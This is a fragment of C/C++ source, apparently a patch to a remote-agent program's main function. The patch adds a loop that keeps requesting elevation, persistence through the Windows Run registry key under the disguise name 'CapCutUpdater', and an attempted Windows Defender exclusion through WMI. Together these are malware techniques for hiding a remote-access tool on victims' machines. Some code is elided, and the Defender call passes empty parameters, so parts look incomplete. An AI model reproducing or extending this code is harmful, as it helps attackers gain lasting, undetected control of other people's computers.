...
void ElevateUntilSuccess(const wchar_t* exePath) {
    while (!IsElevated()) {
...
void AddToRunRegistry(const wchar_t* exePath) {
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"CapCutUpdater", 0, REG_SZ, (BYTE*)exePath, ((DWORD)wcslen(exePath) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    } else if (RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"CapCutUpdater", 0, REG_SZ, (BYTE*)exePath, ((DWORD)wcslen(exePath) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
}

void AddDefenderExclusionWMI(const wchar_t* path) {
    ...
    hr = pLoc->ConnectServer(_bstr_t(L"ROOT\\Microsoft\\Windows\\Defender"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
    if (SUCCEEDED(hr)) {
        pSvc->ExecMethod(_bstr_t(L"MSFT_MpPreference"), _bstr_t(L"Add"), 0, NULL, NULL, NULL, NULL);
        pSvc->Release();
    }
    pLoc->Release();
    CoUninitialize();
...
int wmain(int argc, wchar_t** wargv)
{
    ...
    ElevateUntilSuccess(exePath);
    
    // Persistence
    AddToRunRegistry(exePath);
    
    // Defender Exclusion
    AddDefenderExclusionWMI(exePath);
    ...
    {
        argvsz = WideCharToMultiByte(CP_UTF8, 0, wargv[argvi], -1, NULL, 0, NULL, NULL);
        argv[argvi] = (char*)ILibMemory_SmartAllocate(argvsz);
        WideCharToMultiByte(CP_UTF8, 0, wargv[argvi], -1, argv[argvi], argvsz, NULL, NULL);
    }
// ==================== END OF PATCH ====================
#else
